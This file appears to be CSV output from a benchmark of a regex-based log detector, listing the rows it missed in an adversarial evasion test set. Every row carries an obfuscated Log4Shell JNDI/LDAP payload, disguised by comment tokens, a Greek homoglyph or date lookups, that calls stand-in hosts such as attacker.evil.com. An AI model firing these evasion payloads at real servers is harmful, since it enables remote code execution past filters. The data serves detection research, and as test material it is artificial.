model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Regex Baseline,adversarial_evasion_test.csv,LS-001654,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | method: get | host: app.local | path: /metrics,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001655,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001656,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001789,adversarial_evasion,GET /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001790,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001791,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001792,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001793,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001794,adversarial_evasion,GET /search?q=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1 host: app.local user-agent: go-http-client/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001795,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://log4j-test.invalid/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://log4j-test.invalid/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001796,adversarial_evasion,GET /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001797,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001798,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | method: get | host: app.local | path: /search?q=boots,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001799,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001800,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001825,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001826,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001827,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} | method: get | host: app.local | path: /search?q=boots,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001828,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},request from user-agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001829,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /home | x-api-version: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001830,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} http/1.1 host: app.local user-agent: curl/7.88.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001831,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001832,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001833,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001834,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn} | method: get | host: app.local | path: /search?q=boots,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001835,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},request from user-agent: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001836,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: / | x-api-version: ${${date:'jn'}di:ldap://log4j-test.invalid/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001873,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001874,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001875,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | method: get | host: app.local | path: /home,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001876,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001877,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001878,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1 host: app.local user-agent: go-http-client/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001879,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001880,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001881,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001882,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | method: get | host: app.local | path: /metrics,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001883,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
